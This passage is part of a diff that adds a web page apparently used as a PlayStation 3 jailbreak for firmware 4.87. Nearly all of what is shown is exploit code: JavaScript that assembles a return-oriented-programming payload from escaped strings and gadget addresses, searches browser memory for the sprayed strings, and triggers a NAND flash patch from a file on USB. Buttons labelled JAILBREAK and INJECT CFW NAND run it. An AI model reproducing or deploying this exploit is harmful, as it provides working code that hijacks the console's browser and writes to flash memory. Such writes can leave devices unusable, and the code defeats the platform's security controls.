+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50400)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x700)+hexw2bin(ros1flash_addr2)
+					+hexw2bin(sec_step)+hexw2bin(ros1_start_sector+sec_step)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50500)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x800)+hexw2bin(ros1flash_addr3)
+					+hexw2bin(sec_step)+hexw2bin(ros1_start_sector+(2*sec_step))+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50600)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x900)+hexw2bin(ros1flash_addr4)
+					+hexw2bin(sec_endstep)+hexw2bin(ros1_start_sector+(3*sec_step))+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50700)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssc)+unescape("\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07")
+					+unescape("\uFF06\uFF06\uFF05\uFF05\uFF04\uFF04\uFF03\uFF03\uFF09\uFF09\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374")
+					+unescape("\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334")
+					+unescape("\u0000\u0000")+hexw2bin(temp_addr+0xA00)+unescape("\u0000\u0000")+hexw2bin(sp_exit)+unescape("\u9900\u0102\u0304\u0506\u0000\u0000")+hexw2bin(gadget8_addr)+unescape("\u2F2A");
+		
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(stack_frame_addr===0);
+		jump_2=unescape("\u0102\u7EFB\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")
+		+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(jump_2_addr===0);
+		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(jump_1_addr===0);
+		
+		var u=checkMemory(usb_fp_addr-0x4,0x100,usb_fp.length);
+		var j2=checkMemory(jump_2_addr-0x4,0x100,jump_2.length);
+		var j1=checkMemory(jump_1_addr-0x4,0x100,jump_1.length);
+		if((j2===jump_2)&&(j1===jump_1)&&(u===usb_fp))
+		{
+			if(t_out!=0){clearTimeout(t_out);}
+			showResult(hr+"<h1><b><font color=%22386E38%22>Exploit Initialization SUCCESS...!</font></b></h1><h3><b><font color=%22000000%22>You can now proceed to patch the NAND Flash Memory!</font></b></h3>");
+			enable_trigger();
+		}
+		else 
+		{
+			logAdd("String mismatch in memory!");
+			if(total_loops<max_loops)reload();
+			else fail();
+		}
+	} 
+	catch(e) 
+	{
+		debug=true;
+		logAdd(br+"Exploit initialization failed because the following exception was thrown during execution:"+br+e);
+		debug=false;
+	}
+}
+function triggerX()
+{
+	clearLogEntry();
+	showResult(hr+"<h1><b>Proceeding to patch NAND Flash Memory...</b></h1><h3><b><font color=%22000000%22>Please wait, the patch operation takes a few minutes!</font></b></h3>");
+	disable_cb();
+	disable_btn();
+	setTimeout(trigger,1000,jump_1_addr);
+	setTimeout(success,2000,hr+"<h1><b><font color=%22386E38%22>NAND Flash memory patch operation completed..!</font></b></h1><h3><b><font color=%22000000%22>You can dump the NAND now & check that the patch has been applied successfully."+br+"Then reboot to enable the patches & install the 4.87 CFW of your choice...</font></b></h3>");
+}
+</script>
+</head>
+	<style>html,body{margin:auto;height:100%;overflow:hidden;font-family:sans-serif;font-size:18px;font-weight:bold;text-align:center;color:#FFFFFF;background:#000000;}
+	.button { background-color: #003263;border-radius: 5px;color: white;padding: .5em;text-decoration: none;height:100%;display:inline-table;}.button:focus,.button:hover { background-color: #007bff;color: White; }</style>
+	<div id="HeaderID" style="color:#CC2010">
+	<h1>PS3 CFW NAND INJECT UNTUK HFW 4.87</h1>
+	<h4><font color="#FFFFFF">
+	<h2>MENDUKUNG SEMUA SERI PS3 FAT NAND</h2>
+	<h2>PATCH MEMBUTUHKAN SEDIKIT WAKTU....!!!!</h2>	
+	<font color="#CC2010"><b><i>LOKASI ANDA MENARUH flash.hex:</i></b></font><br><br>/dev_usb000/flash_487.hex<input type="checkbox" id="usb0" name="/dev_usb000" onclick="usb(0);" checked/> | /dev_usb001/flash_487.hex<input type="checkbox" id="usb1" name="/dev_usb001" onclick="usb(1);"/>	| /dev_usb006/flash_487.hex<input type="checkbox" id="usb6" name="/dev_usb006" onclick="usb(6);"/><br>
+	<br>
+	<table align="center" colspan="2"><button id="btnROP" class="button" onclick="initROP();" autofocus style="width:250px">JAILBREAK</button> | 
+	<button id="btnTrigger" disabled="true" class="button" onclick="triggerX();" style="width:250px">INJECT CFW NAND</button>
+	</table>
+	<div id="result" style="color:#FFFFFF"></div><br>
+	<div id="log"></div>
+	<div id="exploit" ></div>
+	<div id="trigger"></div>
+	<div id="footer" style="color:#FFFFFF"></div>
+	<script type="text/javascript" >
+		writeEnvInfo();
+		ps3chk();
+	</script>
+	</body>
+</html>
